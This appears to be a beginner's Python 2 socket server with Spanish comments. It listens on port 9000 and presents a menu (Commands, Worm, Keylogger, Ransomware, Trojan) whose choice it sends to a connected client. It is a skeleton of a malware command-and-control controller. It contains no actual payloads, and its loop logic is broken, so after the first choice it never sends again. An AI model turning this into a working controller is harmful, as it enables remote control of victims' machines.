# -*- coding: UTF-8 -*-
#Servidor basico
#Escucha en el puerto 9000 a las conexiones y las acepta
#TRY Y EXCEPT = Cazar errores. Intenta lo del Try, en caso de error, salta el except.
try:
	#IMPORTAMOS ESOS MÓDULOS
	from socket import *
	s = socket(AF_INET,SOCK_STREAM)
	#INICIA CON TODAS LAS DIRECCIONES (O A LA IP QUE LE INDICAMOS S.BIND('127.0.0.1',9000)) EN EL PUERTO QUE INDICAMOS
	s.bind(("",9000))
	#ESCUCHA 5 CONEXIONES COMO MÁXIMO
	s.listen(5)
	
	
	#PAREJA OBJETO DE SOCKET - DIRECCIÓN Y PUERTO
	#C es el socket object
	#A es la dirección y puerto ("127.0.0.1",60542)
	c,a = s.accept()
	
	
	#Luego muestra por pantalla quién se ha conectado
	print 'Received connection from ', a
	
	
	#OPCIONES DESDE EL SERVIDOR:
	opcion = str(raw_input('Inserte una opciOn:\n0 - Commands\n1 - Worm\n2 - Keylogger\n3 - Ransomware\n4 - Trojan\n quit - Exit\n'))

	while True:

		#OPCIONES ELEGIDAS. SI ES UNA DE LAS MARCADAS, ENTONCES:
		if opcion == '0' or opcion == '1' or opcion == '2' or opcion == '3' or opcion == '4' or opcion == 'quit':
			#EN FUNCIÓN DE LA OPCIÓN, SE ENVÍA UN VALOR DETERMINADO QUE RECIBE EL CLIENTE
			while True:
				if opcion == '0':
					print 'Command'
					c.send(opcion)
					pass
				elif opcion == '1':
					print 'Worm'
					c.send(opcion)
					pass
				elif opcion == '2':
					print 'Keylogger'
					c.send(opcion)
					pass
				elif opcion == '3':
					print 'Ransomware'
					c.send(opcion)
					pass
				elif opcion == '4':
					print 'Trojan'
					c.send(opcion)
					pass
				elif opcion == 'quit':
					print 'Exit'
					c.send(opcion)
					pass
					
				while True:
					opcion = str(raw_input('Inserta una nueva opciOn'))
					if opcion == '0' or opcion == '1' or opcion == '2' or opcion == '3' or opcion == '4' or opcion == 'quit':
						pass
					else:
						print 'La opciOn no es ni 1, ni 2, ni 3, ni 4, ni "quit"'
			
		#EN CASO DE QUE LA OPCIÓN ELEGIDA NO EXISTA:
		else:
			print 'La opciOn no es ni 1, ni 2, ni 3, ni 4, ni "quit"'	
	
except:
	print 'Se cortO la conexión.'
